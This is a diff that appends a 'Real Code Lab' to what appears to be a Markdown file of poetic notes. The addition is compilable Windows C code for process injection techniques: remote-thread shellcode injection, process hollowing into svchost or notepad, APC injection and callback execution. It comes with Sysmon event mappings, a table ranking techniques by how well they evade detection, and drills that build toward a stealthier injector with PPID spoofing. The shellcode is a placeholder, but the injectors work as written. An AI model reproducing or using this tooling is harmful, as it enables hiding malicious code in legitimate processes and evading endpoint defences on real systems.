@@ -1381,3 +1381,272 @@ you can't suppress it.
 
 — cold steel forged in memory,
 every THREAD a wire drawn through someone else's house
+
+
+---
+
+## Real Code Lab — Build Every Technique from Zero
+
+Compile all examples with:
+```
+x86_64-w64-mingw32-gcc inject.c -o inject.exe -lkernel32
+```
+
+---
+
+### Lab 1 — Find a Target PID by Process Name
+
+```c
+#include <windows.h>
+#include <tlhelp32.h>
+#include <stdio.h>
+
+DWORD getPidByName(const char *name) {
+    PROCESSENTRY32 entry = { sizeof(entry) };
+    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (snap == INVALID_HANDLE_VALUE) return 0;
+    if (Process32First(snap, &entry)) {
+        do {
+            if (_stricmp(entry.szExeFile, name) == 0) {
+                CloseHandle(snap);
+                return entry.th32ProcessID;
+            }
+        } while (Process32Next(snap, &entry));
+    }
+    CloseHandle(snap);
+    return 0;
+}
+
+int main() {
+    DWORD pid = getPidByName("notepad.exe");
+    printf(pid ? "[+] PID: %lu\n" : "[-] not found\n", pid);
+    return 0;
+}
+```
+
+// DRILL: Find all running svchost.exe PIDs — there will be multiple.
+
+---
+
+### Lab 2 — Classic Shellcode Injection via CreateRemoteThread
+
+Open → Allocate RWX → Write → Execute. Foundational. Most detected.
+
+```c
+#include <windows.h>
+#include <stdio.h>
+
+// Replace with msfvenom -p windows/x64/exec CMD=calc.exe -f c output
+unsigned char shellcode[] = { 0x90, 0x90, 0xC3 };  // NOP NOP RET placeholder
+SIZE_T shellcode_len = sizeof(shellcode);
+
+int inject_crt(DWORD pid) {
+    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    if (!hProc) { printf("[-] OpenProcess: %lu\n", GetLastError()); return 1; }
+
+    // VirtualAllocEx RWX — Sysmon watches this
+    LPVOID remote = VirtualAllocEx(hProc, NULL, shellcode_len,
+                                   MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!remote) { printf("[-] VirtualAllocEx failed\n"); return 1; }
+
+    SIZE_T written;
+    WriteProcessMemory(hProc, remote, shellcode, shellcode_len, &written);
+    printf("[+] wrote %zu bytes to %p\n", written, remote);
+
+    // CreateRemoteThread — Sysmon Event ID 8 fires here
+    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0,
+                                        (LPTHREAD_START_ROUTINE)remote, NULL, 0, NULL);
+    if (!hThread) { printf("[-] CreateRemoteThread: %lu\n", GetLastError()); return 1; }
+
+    printf("[+] remote thread TID: %lu\n", GetThreadId(hThread));
+    WaitForSingleObject(hThread, 5000);
+    CloseHandle(hThread);
+    CloseHandle(hProc);
+    return 0;
+}
+```
+
+**Sysmon fires:** Event ID 10 (OpenProcess) + Event ID 8 (CreateRemoteThread).
+**Evasion:** Use APC injection instead — no Event ID 8.
+
+// DRILL: Inject a shellcode that calls MessageBoxA. Capture Sysmon logs.
+// Map every Event ID to the exact line of C that triggered it.
+
+---
+
+### Lab 3 — Process Hollowing
+
+Spawn svchost.exe suspended → overwrite its memory with your PE → redirect entry point → resume. Task Manager shows svchost. Your code runs.
+
+```c
+#include <windows.h>
+#include <winternl.h>
+#include <stdio.h>
+
+typedef NTSTATUS (NTAPI *pNtQIP)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
+
+int hollow(const char *target, unsigned char *payload, SIZE_T payload_size) {
+    STARTUPINFOA si = { sizeof(si) };
+    PROCESS_INFORMATION pi = {0};
+
+    // Spawn suspended — no code runs yet
+    if (!CreateProcessA(NULL, (LPSTR)target, NULL, NULL, FALSE,
+                        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
+        printf("[-] CreateProcess: %lu\n", GetLastError()); return 1;
+    }
+    printf("[*] %s spawned suspended PID=%lu\n", target, pi.dwProcessId);
+
+    // Get PEB to find image base
+    pNtQIP NtQIP = (pNtQIP)GetProcAddress(GetModuleHandleA("ntdll.dll"),
+                                           "NtQueryInformationProcess");
+    PROCESS_BASIC_INFORMATION pbi = {0};
+    NtQIP(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), NULL);
+
+    // Read ImageBaseAddress from PEB (offset 0x10 on x64)
+    LPVOID image_base;
+    ReadProcessMemory(pi.hProcess,
+                      (LPVOID)((ULONG_PTR)pbi.PebBaseAddress + 0x10),
+                      &image_base, sizeof(image_base), NULL);
+    printf("[*] image base: %p\n", image_base);
+
+    // Write payload at image base
+    LPVOID new_base = VirtualAllocEx(pi.hProcess, image_base, payload_size,
+                                     MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    WriteProcessMemory(pi.hProcess, new_base, payload, payload_size, NULL);
+
+    // Redirect RIP to payload entry point
+    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(payload +
+        ((PIMAGE_DOS_HEADER)payload)->e_lfanew);
+    LPVOID oep = (LPVOID)((ULONG_PTR)new_base +
+        nt->OptionalHeader.AddressOfEntryPoint);
+
+    CONTEXT ctx = { .ContextFlags = CONTEXT_FULL };
+    GetThreadContext(pi.hThread, &ctx);
+    ctx.Rcx = (DWORD64)oep;  // x64: entry point in RCX
+    SetThreadContext(pi.hThread, &ctx);
+    printf("[+] OEP redirected to %p — resuming\n", oep);
+
+    ResumeThread(pi.hThread);
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
+    return 0;
+}
+```
+
+// DRILL: Hollow notepad.exe with a payload that spawns calc.exe.
+// Verify: Task Manager shows notepad, but calc is a child process.
+// Use Process Hacker memory map — PE headers will not match disk.
+
+---
+
+### Lab 4 — APC Injection (No Sysmon Event ID 8)
+
+Queue shellcode as an Asynchronous Procedure Call. No CreateRemoteThread.
+No Event ID 8. Thread executes it on next alertable wait.
+
+```c
+#include <windows.h>
+#include <tlhelp32.h>
+#include <stdio.h>
+
+DWORD getFirstThread(DWORD pid) {
+    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+    THREADENTRY32 te = { sizeof(te) };
+    if (Thread32First(snap, &te)) {
+        do {
+            if (te.th32OwnerProcessID == pid) {
+                CloseHandle(snap);
+                return te.th32ThreadID;
+            }
+        } while (Thread32Next(snap, &te));
+    }
+    CloseHandle(snap);
+    return 0;
+}
+
+int apc_inject(DWORD pid, unsigned char *sc, SIZE_T sc_len) {
+    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    LPVOID remote = VirtualAllocEx(hProc, NULL, sc_len,
+                                   MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    SIZE_T written;
+    WriteProcessMemory(hProc, remote, sc, sc_len, &written);
+
+    DWORD tid = getFirstThread(pid);
+    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, tid);
+    printf("[*] queuing APC on thread %lu\n", tid);
+
+    // QueueUserAPC — fires when thread calls SleepEx/WaitForSingleObjectEx
+    // with bAlertable=TRUE. Notepad/explorer threads do this constantly.
+    if (!QueueUserAPC((PAPCFUNC)remote, hThread, 0)) {
+        printf("[-] QueueUserAPC: %lu\n", GetLastError()); return 1;
+    }
+    printf("[+] APC queued at %p — waiting for alertable state\n", remote);
+
+    CloseHandle(hThread);
+    CloseHandle(hProc);
+    return 0;
+}
+```
+
+**No Sysmon Event ID 8.** The thread that executes your shellcode is the
+target's own thread — not one you created. Alertable threads in notepad,
+explorer, and most GUI applications call SleepEx or MsgWaitForMultipleObjectsEx
+continuously. Your APC fires within seconds.
+
+// DRILL: APC-inject into notepad.exe. Run Sysmon. Confirm Event ID 8 is
+// absent. Compare the log to Lab 2 CRT injection.
+
+---
+
+### Lab 5 — Callback Execution (Zero Thread Creation)
+
+`EnumWindows` takes a callback function pointer. Point it at shellcode.
+No thread spawn. No APC. No CreateRemoteThread.
+
+```c
+#include <windows.h>
+#include <stdio.h>
+
+void callback_exec(unsigned char *sc, SIZE_T len) {
+    LPVOID mem = VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE,
+                               PAGE_EXECUTE_READWRITE);
+    memcpy(mem, sc, len);
+
+    // Shellcode runs as an EnumWindows callback — BOOL CALLBACK fn(HWND, LPARAM)
+    EnumWindows((WNDENUMPROC)mem, 0);
+    printf("[+] callback executed\n");
+    VirtualFree(mem, 0, MEM_RELEASE);
+}
+```
+
+**Other callback vectors — all work the same way:**
+```c
+EnumChildWindows(NULL, (WNDENUMPROC)sc, 0);
+EnumSystemLocalesA((LOCALE_ENUMPROCA)sc, 0);
+CreateTimerQueueTimer(&t, NULL, (WAITORTIMERCALLBACK)sc, NULL, 0, 0, 0);
+```
+
+// DRILL: Execute a MessageBoxA stub via EnumWindows. Check Sysmon for
+// thread creation events — there should be none.
+
+---
+
+### Detection Map
+
+| Technique | Sysmon Event ID | Evades CRT detection? |
+|---|---|---|
+| CreateRemoteThread | 8 (always) | No |
+| APC Injection | None | Yes |
+| Process Hollowing | 1 (process spawn) | Partial |
+| Callback Exec | None | Yes |
+
+Move left on this table. Know what you leave behind.
+
+---
+
+// DRILL CAPSTONE: Build one injector that:
+// 1. Finds notepad.exe PID via Toolhelp32
+// 2. Injects shellcode via APC — no Event ID 8
+// 3. Shellcode calls WinExec("calc.exe", SW_SHOW)
+// 4. Run Sysmon — document every event that fires
+// 5. Look up PPID spoofing — eliminate Event ID 1 as a stretch goal
